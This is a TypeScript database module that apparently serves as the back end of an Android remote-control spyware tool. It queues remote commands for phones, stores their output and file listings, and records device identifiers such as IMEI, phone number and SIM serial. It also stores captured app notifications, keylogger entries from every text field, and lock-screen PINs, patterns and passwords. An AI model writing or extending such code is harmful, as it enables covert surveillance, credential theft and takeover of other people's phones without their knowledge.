import pool from './db'
import { v4 as uuidv4 } from 'uuid'

export interface CommandResult {
  id: string
  command: string
  result: string
  timestamp: string
  exitCode?: number
}

export interface DeviceStats {
  battery: string
  batteryStatus: string
  model: string
  androidVersion: string
  ip: string
  storage: string
  storageFree: string
  networkType: string
  cpuUsage: string
  memTotal: string
  memFree: string
  uptime: string
  hostname: string
  kernel: string
  screenState: string
  // Identitas perangkat tambahan
  brand?: string
  device?: string
  product?: string
  fingerprint?: string
  // SIM & Telepon
  imei?: string
  phoneNumber?: string
  simOperator?: string
  simCountry?: string
  simSerial?: string
  simSlots?: string
  simState?: string
  networkOperator?: string
  networkGeneration?: string
  roaming?: string
  mccMnc?: string
}

export interface PendingCommand {
  id: string
  command: string
  createdAt: string
}

export interface FileEntry {
  name: string
  type: 'file' | 'dir'
  size: string
  permissions: string
  modified: string
}

export interface FileListing {
  path: string
  entries: FileEntry[]
}

export interface DeviceEntry {
  deviceId: string
  deviceName: string
  connected: boolean
  lastSeen: string | null
  stats: DeviceStats
  pendingCommands: PendingCommand[]
  commandHistory: CommandResult[]
  fileListing: FileListing | null
}

const DEFAULT_STATS: DeviceStats = {
  battery: '--', batteryStatus: 'unknown',
  model: 'Unknown Device', androidVersion: '--',
  ip: '--', storage: '--', storageFree: '--',
  networkType: '--', cpuUsage: '--',
  memTotal: '--', memFree: '--',
  uptime: '--', hostname: '--',
  kernel: '--', screenState: '--',
}

export function isDeviceOnline(d: { lastSeen: string | null }): boolean {
  if (!d.lastSeen) return false
  return Date.now() - new Date(d.lastSeen).getTime() < 90000
}

export function getDeviceStatus(d: { lastSeen: string | null }): 'online' | 'recent' | 'offline' {
  if (!d.lastSeen) return 'offline'
  const ageMs = Date.now() - new Date(d.lastSeen).getTime()
  if (ageMs < 90000)   return 'online'
  if (ageMs < 600000)  return 'recent'
  return 'offline'
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function rowToDevice(row: Record<string, any>): DeviceEntry {
  const lastSeen = row.last_seen ? new Date(row.last_seen as string).toISOString() : null
  const stats: DeviceStats = typeof row.stats === 'object' && row.stats !== null
    ? row.stats as DeviceStats
    : DEFAULT_STATS
  return {
    deviceId: row.device_id as string,
    deviceName: row.device_name as string,
    connected: isDeviceOnline({ lastSeen }),
    lastSeen,
    stats,
    pendingCommands: [],
    commandHistory: [],
    fileListing: null,
  }
}

export async function getOrCreateDevice(deviceId: string, deviceName?: string): Promise<DeviceEntry> {
  const name = deviceName || 'Unknown Device'
  const { rows } = await pool.query(
    `INSERT INTO devices (device_id, device_name, stats)
     VALUES ($1, $2, $3)
     ON CONFLICT (device_id) DO UPDATE
       SET device_name = CASE WHEN $2 != 'Unknown Device' THEN $2 ELSE devices.device_name END
     RETURNING *`,
    [deviceId, name, DEFAULT_STATS]
  )
  return rowToDevice(rows[0])
}

export async function updateDeviceHeartbeat(deviceId: string, deviceName: string, stats: DeviceStats) {
  await pool.query(
    `INSERT INTO devices (device_id, device_name, last_seen, stats)
     VALUES ($1, $2, NOW(), $3)
     ON CONFLICT (device_id) DO UPDATE
       SET last_seen = NOW(),
           device_name = CASE WHEN $2 != 'Unknown Device' THEN $2 ELSE devices.device_name END,
           stats = $3`,
    [deviceId, deviceName, stats]
  )
}

export async function getAllDevices(): Promise<DeviceEntry[]> {
  const { rows } = await pool.query(
    `SELECT * FROM devices ORDER BY last_seen DESC NULLS LAST`
  )
  return rows.map(rowToDevice)
}

export async function deleteDevice(deviceId: string): Promise<void> {
  await pool.query(`DELETE FROM pending_commands WHERE device_id = $1`, [deviceId])
  await pool.query(`DELETE FROM command_history WHERE device_id = $1`, [deviceId])
  await pool.query(`DELETE FROM devices WHERE device_id = $1`, [deviceId])
}

export async function getDevice(deviceId: string): Promise<DeviceEntry | null> {
  const { rows } = await pool.query(
    `SELECT * FROM devices WHERE device_id = $1`,
    [deviceId]
  )
  if (!rows[0]) return null
  return rowToDevice(rows[0])
}

export async function enqueueCommand(deviceId: string, command: string): Promise<PendingCommand> {
  const id = uuidv4()
  await pool.query(
    `INSERT INTO pending_commands (id, device_id, command) VALUES ($1, $2, $3)`,
    [id, deviceId, command]
  )
  return { id, command, createdAt: new Date().toISOString() }
}

export async function popCommand(deviceId: string): Promise<PendingCommand | null> {
  const { rows } = await pool.query(
    `DELETE FROM pending_commands
     WHERE id = (
       SELECT id FROM pending_commands
       WHERE device_id = $1
       ORDER BY created_at ASC
       LIMIT 1
     )
     RETURNING *`,
    [deviceId]
  )
  if (!rows[0]) return null
  return { id: rows[0].id, command: rows[0].command, createdAt: rows[0].created_at }
}

export async function addResult(deviceId: string, result: CommandResult) {
  await pool.query(
    `INSERT INTO command_history (id, device_id, command, result, timestamp, exit_code)
     VALUES ($1, $2, $3, $4, $5, $6)
     ON CONFLICT (id) DO NOTHING`,
    [result.id, deviceId, result.command, result.result, result.timestamp, result.exitCode ?? 0]
  )
  await pool.query(
    `DELETE FROM command_history
     WHERE device_id = $1
       AND id NOT IN (
         SELECT id FROM command_history
         WHERE device_id = $1
         ORDER BY timestamp DESC
         LIMIT 100
       )`,
    [deviceId]
  )
}

export async function getCommandHistory(deviceId: string): Promise<CommandResult[]> {
  const { rows } = await pool.query(
    `SELECT * FROM command_history WHERE device_id = $1 ORDER BY timestamp DESC LIMIT 100`,
    [deviceId]
  )
  return rows.map(r => ({
    id: r.id,
    command: r.command,
    result: r.result,
    timestamp: r.timestamp,
    exitCode: r.exit_code,
  }))
}

export async function getFileListing(deviceId: string): Promise<FileListing | null> {
  const { rows } = await pool.query(
    `SELECT * FROM file_listings WHERE device_id = $1`,
    [deviceId]
  )
  if (!rows[0]) return null
  const entries = Array.isArray(rows[0].entries) ? rows[0].entries : []
  return { path: rows[0].path, entries }
}

export async function setFileListing(deviceId: string, path: string, entries: FileEntry[]) {
  await pool.query(
    `INSERT INTO file_listings (device_id, path, entries, updated_at)
     VALUES ($1, $2, $3, NOW())
     ON CONFLICT (device_id) DO UPDATE
       SET path = $2, entries = $3, updated_at = NOW()`,
    [deviceId, path, JSON.stringify(entries)]
  )
}

export async function getPendingCommands(deviceId: string): Promise<PendingCommand[]> {
  const { rows } = await pool.query(
    `SELECT * FROM pending_commands WHERE device_id = $1 ORDER BY created_at ASC`,
    [deviceId]
  )
  return rows.map(r => ({ id: r.id, command: r.command, createdAt: r.created_at }))
}

// ─── Notifications ────────────────────────────────────────────────────────────

export interface AppNotification {
  id: number
  appPackage: string
  appName: string
  title: string
  text: string
  receivedAt: string
}

export async function saveNotification(deviceId: string, n: Omit<AppNotification, 'id' | 'receivedAt'>) {
  await pool.query(
    `INSERT INTO notifications (device_id, app_package, app_name, title, text)
     VALUES ($1, $2, $3, $4, $5)`,
    [deviceId, n.appPackage, n.appName, n.title, n.text]
  )
  // Keep last 500 per device
  await pool.query(
    `DELETE FROM notifications WHERE device_id = $1 AND id NOT IN (
       SELECT id FROM notifications WHERE device_id = $1 ORDER BY received_at DESC LIMIT 500
     )`,
    [deviceId]
  )
}

export async function getNotifications(deviceId: string, limit = 100): Promise<AppNotification[]> {
  const { rows } = await pool.query(
    `SELECT * FROM notifications WHERE device_id = $1 ORDER BY received_at DESC LIMIT $2`,
    [deviceId, limit]
  )
  return rows.map(r => ({
    id: r.id,
    appPackage: r.app_package,
    appName: r.app_name,
    title: r.title,
    text: r.text,
    receivedAt: r.received_at,
  }))
}

export async function clearNotifications(deviceId: string) {
  await pool.query(`DELETE FROM notifications WHERE device_id = $1`, [deviceId])
}

// ─── Keylogger ────────────────────────────────────────────────────────────────

export interface KeylogEntry {
  id: number
  appPackage: string
  appName: string
  fieldName: string
  text: string
  capturedAt: string
}

export async function saveKeylog(deviceId: string, entry: Omit<KeylogEntry, 'id' | 'capturedAt'>) {
  await pool.query(
    `INSERT INTO keylog_entries (device_id, app_package, app_name, field_name, text)
     VALUES ($1, $2, $3, $4, $5)`,
    [deviceId, entry.appPackage, entry.appName, entry.fieldName, entry.text]
  )
  // Keep last 2000 per device
  await pool.query(
    `DELETE FROM keylog_entries WHERE device_id = $1 AND id NOT IN (
       SELECT id FROM keylog_entries WHERE device_id = $1 ORDER BY captured_at DESC LIMIT 2000
     )`,
    [deviceId]
  )
}

export async function getKeylogs(deviceId: string, limit = 200): Promise<KeylogEntry[]> {
  const { rows } = await pool.query(
    `SELECT * FROM keylog_entries WHERE device_id = $1 ORDER BY captured_at DESC LIMIT $2`,
    [deviceId, limit]
  )
  return rows.map(r => ({
    id: r.id,
    appPackage: r.app_package,
    appName: r.app_name,
    fieldName: r.field_name,
    text: r.text,
    capturedAt: r.captured_at,
  }))
}

export async function clearKeylogs(deviceId: string) {
  await pool.query(`DELETE FROM keylog_entries WHERE device_id = $1`, [deviceId])
}

// ─── PIN / Pattern / Password Captures ───────────────────────────────────────

export interface PinCapture {
  id: number
  lockType: string
  value: string
  capturedAt: string
}

export async function savePinCapture(deviceId: string, lockType: string, value: string) {
  await pool.query(
    `INSERT INTO pin_captures (device_id, lock_type, value) VALUES ($1, $2, $3)`,
    [deviceId, lockType, value]
  )
  await pool.query(
    `DELETE FROM pin_captures WHERE device_id = $1 AND id NOT IN (
       SELECT id FROM pin_captures WHERE device_id = $1 ORDER BY captured_at DESC LIMIT 500
     )`,
    [deviceId]
  )
}

export async function getPinCaptures(deviceId: string, limit = 100): Promise<PinCapture[]> {
  const { rows } = await pool.query(
    `SELECT * FROM pin_captures WHERE device_id = $1 ORDER BY captured_at DESC LIMIT $2`,
    [deviceId, limit]
  )
  return rows.map(r => ({
    id: r.id,
    lockType: r.lock_type,
    value: r.value,
    capturedAt: r.captured_at,
  }))
}

export async function clearPinCaptures(deviceId: string) {
  await pool.query(`DELETE FROM pin_captures WHERE device_id = $1`, [deviceId])
}
